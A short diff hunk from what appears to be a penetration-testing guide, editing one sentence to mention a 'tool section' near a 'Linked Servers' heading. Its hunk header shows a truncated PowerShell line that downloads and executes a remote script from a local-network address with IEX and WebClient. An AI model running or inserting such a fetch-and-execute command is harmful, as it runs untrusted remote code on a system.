@@ -465,7 +465,7 @@ IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.0.1/PowerUpS
   </tbody>
 </table>
 
-More commands can be found in the github repo.
+More commands can be found in the github repo or in the **tool section**.
 
 ### Linked Servers
 
